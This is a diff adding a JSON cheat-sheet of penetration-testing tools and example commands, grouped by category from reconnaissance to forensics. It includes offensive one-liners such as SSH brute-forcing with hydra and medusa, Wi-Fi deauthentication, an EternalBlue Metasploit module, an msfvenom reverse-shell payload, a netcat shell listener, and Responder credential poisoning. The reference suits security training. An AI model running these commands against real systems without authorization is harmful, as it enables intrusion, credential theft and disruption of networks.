@@ -1,0 +1,366 @@
+[
+  {
+    "tool": "ls / cp / grep / ps / kill",
+    "category": "General",
+    "description": "Core file and process management",
+    "keywords": ["file", "list", "copy", "search text", "process", "kill process", "basics"],
+    "commands": [
+      {"cmd": "ls -la", "desc": "List files, including hidden ones"},
+      {"cmd": "cp file.txt /tmp/", "desc": "Copy a file"},
+      {"cmd": "grep -r \"password\" /etc/", "desc": "Search recursively for text"},
+      {"cmd": "ps aux", "desc": "List running processes"},
+      {"cmd": "kill -9 <PID>", "desc": "Force-kill a process"}
+    ]
+  },
+  {
+    "tool": "apt",
+    "category": "General",
+    "description": "Package management",
+    "keywords": ["install", "update", "package", "software"],
+    "commands": [
+      {"cmd": "apt update && apt upgrade", "desc": "Update package lists and upgrade installed packages"},
+      {"cmd": "apt install <pkg>", "desc": "Install a package"},
+      {"cmd": "apt remove <pkg>", "desc": "Remove a package"}
+    ]
+  },
+  {
+    "tool": "ip / ping / ssh / curl / wget",
+    "category": "General",
+    "description": "Basic networking commands",
+    "keywords": ["network", "connect", "ip address", "download", "remote login"],
+    "commands": [
+      {"cmd": "ip a", "desc": "Show network interfaces and IPs"},
+      {"cmd": "ping -c 4 google.com", "desc": "Test connectivity (4 packets)"},
+      {"cmd": "ssh user@192.168.1.10", "desc": "Remote login over SSH"},
+      {"cmd": "curl -I https://example.com", "desc": "Fetch HTTP headers only"},
+      {"cmd": "wget https://example.com/file.zip", "desc": "Download a file"}
+    ]
+  },
+  {
+    "tool": "nmap",
+    "category": "Recon",
+    "description": "Port and service scanning",
+    "keywords": ["scan", "port scan", "service detection", "os detection", "network mapping"],
+    "commands": [
+      {"cmd": "nmap -sV -O <target>", "desc": "Scan ports, detect service versions and OS"},
+      {"cmd": "nmap -sC -sV -p- <target>", "desc": "Default scripts, scan all 65535 ports"},
+      {"cmd": "nmap -sS -Pn -T4 <target>", "desc": "Stealth SYN scan, skip host discovery"},
+      {"cmd": "nmap --script vuln <target>", "desc": "Run vulnerability detection scripts"}
+    ]
+  },
+  {
+    "tool": "whois / dig",
+    "category": "Recon",
+    "description": "Domain registration and DNS lookups",
+    "keywords": ["domain", "dns", "whois", "lookup"],
+    "commands": [
+      {"cmd": "whois example.com", "desc": "Domain registration info"},
+      {"cmd": "dig example.com ANY", "desc": "Query all DNS records for a domain"}
+    ]
+  },
+  {
+    "tool": "theHarvester",
+    "category": "Recon",
+    "description": "OSINT email and subdomain harvesting",
+    "keywords": ["osint", "email harvesting", "subdomains", "reconnaissance"],
+    "commands": [
+      {"cmd": "theHarvester -d example.com -b google", "desc": "Harvest emails/subdomains via Google"}
+    ]
+  },
+  {
+    "tool": "dnsenum / fierce / amass",
+    "category": "Recon",
+    "description": "DNS and subdomain enumeration",
+    "keywords": ["subdomain enumeration", "dns enum"],
+    "commands": [
+      {"cmd": "dnsenum example.com", "desc": "Enumerate DNS info for a domain"},
+      {"cmd": "fierce --domain example.com", "desc": "Discover subdomains"},
+      {"cmd": "amass enum -d example.com", "desc": "Subdomain enumeration"}
+    ]
+  },
+  {
+    "tool": "netdiscover / arp-scan",
+    "category": "Recon",
+    "description": "Discover live hosts on a local network",
+    "keywords": ["host discovery", "lan scan", "arp"],
+    "commands": [
+      {"cmd": "netdiscover -r 192.168.1.0/24", "desc": "Find live hosts on LAN"},
+      {"cmd": "arp-scan --localnet", "desc": "ARP scan of the local network"}
+    ]
+  },
+  {
+    "tool": "masscan",
+    "category": "Recon",
+    "description": "Very fast port scanner",
+    "keywords": ["fast scan", "mass scan", "port scan"],
+    "commands": [
+      {"cmd": "masscan -p1-65535 192.168.1.0/24 --rate=1000", "desc": "Scan all ports across a subnet quickly"}
+    ]
+  },
+  {
+    "tool": "nikto",
+    "category": "Vulnerability Analysis",
+    "description": "Web server vulnerability scanning",
+    "keywords": ["web scan", "web server vulnerabilities"],
+    "commands": [
+      {"cmd": "nikto -h http://192.168.1.10", "desc": "Scan a web server for known issues"}
+    ]
+  },
+  {
+    "tool": "wpscan",
+    "category": "Vulnerability Analysis",
+    "description": "WordPress vulnerability scanning",
+    "keywords": ["wordpress", "cms scan", "web"],
+    "commands": [
+      {"cmd": "wpscan --url http://example.com --enumerate u", "desc": "Enumerate WordPress users"}
+    ]
+  },
+  {
+    "tool": "sqlmap",
+    "category": "Vulnerability Analysis",
+    "description": "Automated SQL injection testing",
+    "keywords": ["sql injection", "sqli", "database"],
+    "commands": [
+      {"cmd": "sqlmap -u \"http://example.com/page?id=1\" --dbs", "desc": "Test for SQLi and list databases"}
+    ]
+  },
+  {
+    "tool": "searchsploit",
+    "category": "Vulnerability Analysis",
+    "description": "Search Exploit-DB offline",
+    "keywords": ["exploit search", "exploitdb", "cve"],
+    "commands": [
+      {"cmd": "searchsploit apache 2.4.49", "desc": "Search for known exploits"},
+      {"cmd": "searchsploit -m <id>", "desc": "Mirror exploit code locally"}
+    ]
+  },
+  {
+    "tool": "dirb / gobuster / ffuf",
+    "category": "Vulnerability Analysis",
+    "description": "Directory and file brute-forcing on web servers",
+    "keywords": ["directory bruteforce", "fuzzing", "web enumeration"],
+    "commands": [
+      {"cmd": "dirb http://example.com", "desc": "Brute-force directories"},
+      {"cmd": "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt", "desc": "Directory brute-force with gobuster"},
+      {"cmd": "ffuf -u http://example.com/FUZZ -w wordlist.txt", "desc": "Fast web fuzzing"}
+    ]
+  },
+  {
+    "tool": "whatweb",
+    "category": "Vulnerability Analysis",
+    "description": "Fingerprint web technologies",
+    "keywords": ["fingerprint", "web tech detection"],
+    "commands": [
+      {"cmd": "whatweb example.com", "desc": "Identify technologies used by a website"}
+    ]
+  },
+  {
+    "tool": "john",
+    "category": "Password Attacks",
+    "description": "Offline hash cracking",
+    "keywords": ["crack hash", "password cracking", "john the ripper"],
+    "commands": [
+      {"cmd": "john --wordlist=rockyou.txt hashes.txt", "desc": "Crack hashes with a wordlist"}
+    ]
+  },
+  {
+    "tool": "hashcat",
+    "category": "Password Attacks",
+    "description": "GPU-accelerated hash cracking",
+    "keywords": ["crack hash", "gpu cracking"],
+    "commands": [
+      {"cmd": "hashcat -m 0 -a 0 hashes.txt rockyou.txt", "desc": "Crack MD5 hashes with a wordlist (mode 0)"}
+    ]
+  },
+  {
+    "tool": "hydra / medusa / patator",
+    "category": "Password Attacks",
+    "description": "Online brute-force login attacks",
+    "keywords": ["brute force", "login bruteforce", "ssh crack", "online cracking"],
+    "commands": [
+      {"cmd": "hydra -l admin -P rockyou.txt ssh://192.168.1.10", "desc": "Brute-force SSH login"},
+      {"cmd": "medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh", "desc": "Brute-force SSH login (medusa)"},
+      {"cmd": "patator ssh_login host=192.168.1.10 user=admin password=FILE0 0=pass.txt", "desc": "Brute-force SSH login (patator)"}
+    ]
+  },
+  {
+    "tool": "crunch / cewl",
+    "category": "Password Attacks",
+    "description": "Wordlist generation",
+    "keywords": ["wordlist", "generate passwords"],
+    "commands": [
+      {"cmd": "crunch 8 8 abcdefgh123 -o wordlist.txt", "desc": "Generate an 8-character wordlist from a charset"},
+      {"cmd": "cewl http://example.com -w wordlist.txt", "desc": "Generate a wordlist from a website's content"}
+    ]
+  },
+  {
+    "tool": "hashid / hash-identifier",
+    "category": "Password Attacks",
+    "description": "Identify hash types",
+    "keywords": ["identify hash", "hash type"],
+    "commands": [
+      {"cmd": "hashid hash.txt", "desc": "Identify the type of a hash"}
+    ]
+  },
+  {
+    "tool": "aircrack-ng suite",
+    "category": "Wireless",
+    "description": "Wi-Fi auditing (requires compatible adapter)",
+    "keywords": ["wifi", "wireless", "wpa crack", "deauth", "monitor mode"],
+    "commands": [
+      {"cmd": "airmon-ng start wlan0", "desc": "Enable monitor mode on a wireless interface"},
+      {"cmd": "airodump-ng wlan0mon", "desc": "Capture nearby wireless networks"},
+      {"cmd": "aireplay-ng --deauth 10 -a <BSSID> wlan0mon", "desc": "Send deauthentication packets"},
+      {"cmd": "aircrack-ng -w rockyou.txt capture.cap", "desc": "Crack a captured WPA handshake"}
+    ]
+  },
+  {
+    "tool": "metasploit (msfconsole)",
+    "category": "Exploitation",
+    "description": "Exploit framework",
+    "keywords": ["exploit", "metasploit", "msf", "payload"],
+    "commands": [
+      {"cmd": "msfconsole", "desc": "Launch the Metasploit console"},
+      {"cmd": "search type:exploit platform:windows smb", "desc": "(inside msfconsole) search for exploits"},
+      {"cmd": "use exploit/windows/smb/ms17_010_eternalblue", "desc": "(inside msfconsole) select an exploit module"},
+      {"cmd": "set RHOSTS 192.168.1.10", "desc": "(inside msfconsole) set the target"},
+      {"cmd": "run", "desc": "(inside msfconsole) execute the module"}
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "category": "Exploitation",
+    "description": "Payload generation for lab use",
+    "keywords": ["payload generation", "reverse shell", "meterpreter"],
+    "commands": [
+      {"cmd": "msfvenom -l payloads", "desc": "List available payloads"},
+      {"cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe", "desc": "Generate a Windows reverse-shell payload"}
+    ]
+  },
+  {
+    "tool": "crackmapexec",
+    "category": "Exploitation",
+    "description": "Network-wide Windows/SMB enumeration and attacks",
+    "keywords": ["smb", "active directory", "network enumeration"],
+    "commands": [
+      {"cmd": "crackmapexec smb 192.168.1.0/24", "desc": "Enumerate SMB across a subnet"}
+    ]
+  },
+  {
+    "tool": "responder",
+    "category": "Exploitation",
+    "description": "LLMNR/NBT-NS poisoning for credential capture",
+    "keywords": ["poisoning", "credential capture", "llmnr"],
+    "commands": [
+      {"cmd": "responder -I eth0", "desc": "Start Responder on an interface"}
+    ]
+  },
+  {
+    "tool": "tcpdump / tshark",
+    "category": "Sniffing & Forensics",
+    "description": "Packet capture and analysis",
+    "keywords": ["packet capture", "sniffing", "traffic analysis"],
+    "commands": [
+      {"cmd": "tcpdump -i eth0 -w capture.pcap", "desc": "Capture packets to a file"},
+      {"cmd": "tshark -i eth0 -Y \"http\"", "desc": "Capture and filter HTTP traffic"}
+    ]
+  },
+  {
+    "tool": "ettercap / bettercap / mitmproxy",
+    "category": "Sniffing & Forensics",
+    "description": "Man-in-the-middle traffic interception",
+    "keywords": ["mitm", "man in the middle", "intercept traffic"],
+    "commands": [
+      {"cmd": "ettercap -G", "desc": "Launch Ettercap GUI"},
+      {"cmd": "bettercap -iface eth0", "desc": "Launch Bettercap on an interface"},
+      {"cmd": "mitmproxy", "desc": "Intercept HTTP(S) traffic"}
+    ]
+  },
+  {
+    "tool": "binwalk / foremost / volatility",
+    "category": "Sniffing & Forensics",
+    "description": "File and memory forensics",
+    "keywords": ["forensics", "memory analysis", "file carving"],
+    "commands": [
+      {"cmd": "binwalk firmware.bin", "desc": "Find embedded files inside a binary"},
+      {"cmd": "foremost -i disk.img -o output/", "desc": "Carve files from a disk image"},
+      {"cmd": "volatility -f memory.dmp imageinfo", "desc": "Identify a memory dump's profile"}
+    ]
+  },
+  {
+    "tool": "exiftool / steghide / autopsy / bulk_extractor",
+    "category": "Sniffing & Forensics",
+    "description": "Metadata, steganography and disk forensics",
+    "keywords": ["metadata", "steganography", "hidden data", "disk forensics"],
+    "commands": [
+      {"cmd": "exiftool image.jpg", "desc": "Extract metadata from a file"},
+      {"cmd": "steghide extract -sf image.jpg", "desc": "Extract hidden data from an image"},
+      {"cmd": "autopsy", "desc": "Launch the Autopsy forensics GUI"},
+      {"cmd": "bulk_extractor -o out/ disk.img", "desc": "Extract forensic artifacts from a disk image"}
+    ]
+  },
+  {
+    "tool": "gdb / radare2 / ghidra",
+    "category": "Reverse Engineering",
+    "description": "Binary debugging and disassembly",
+    "keywords": ["reverse engineering", "debugging", "disassemble"],
+    "commands": [
+      {"cmd": "gdb ./binary", "desc": "Debug a binary"},
+      {"cmd": "radare2 -A ./binary", "desc": "Analyze a binary with radare2"},
+      {"cmd": "ghidra", "desc": "Launch the Ghidra GUI"}
+    ]
+  },
+  {
+    "tool": "strings / objdump / file / ltrace / strace / checksec",
+    "category": "Reverse Engineering",
+    "description": "Quick binary inspection utilities",
+    "keywords": ["binary analysis", "inspect binary", "trace calls", "protections"],
+    "commands": [
+      {"cmd": "strings ./binary | less", "desc": "Print readable strings from a binary"},
+      {"cmd": "objdump -d ./binary", "desc": "Disassemble a binary"},
+      {"cmd": "file ./binary", "desc": "Identify a file's type"},
+      {"cmd": "ltrace ./binary", "desc": "Trace library calls"},
+      {"cmd": "strace ./binary", "desc": "Trace system calls"},
+      {"cmd": "checksec ./binary", "desc": "Check binary security protections (ASLR, NX, etc.)"}
+    ]
+  },
+  {
+    "tool": "setoolkit",
+    "category": "Social Engineering",
+    "description": "Social Engineering Toolkit",
+    "keywords": ["phishing", "social engineering"],
+    "commands": [
+      {"cmd": "setoolkit", "desc": "Launch the Social Engineering Toolkit"}
+    ]
+  },
+  {
+    "tool": "netcat (nc)",
+    "category": "Useful Extras",
+    "description": "Raw connections and simple listeners",
+    "keywords": ["listener", "reverse shell catcher", "raw connection"],
+    "commands": [
+      {"cmd": "nc -lvnp 4444", "desc": "Start a listener (e.g. to catch a reverse shell)"},
+      {"cmd": "nc 192.168.1.10 80", "desc": "Connect to a port"}
+    ]
+  },
+  {
+    "tool": "tmux",
+    "category": "Useful Extras",
+    "description": "Terminal multiplexer for multiple panes/sessions",
+    "keywords": ["multiple terminals", "session manager"],
+    "commands": [
+      {"cmd": "tmux new -s session1", "desc": "Create a new tmux session"},
+      {"cmd": "tmux attach -t session1", "desc": "Reattach to a session"}
+    ]
+  },
+  {
+    "tool": "man / --help",
+    "category": "Useful Extras",
+    "description": "Built-in documentation",
+    "keywords": ["help", "manual", "docs"],
+    "commands": [
+      {"cmd": "man nmap", "desc": "View a tool's manual page"},
+      {"cmd": "nmap --help", "desc": "View a tool's quick help"}
+    ]
+  }
+]
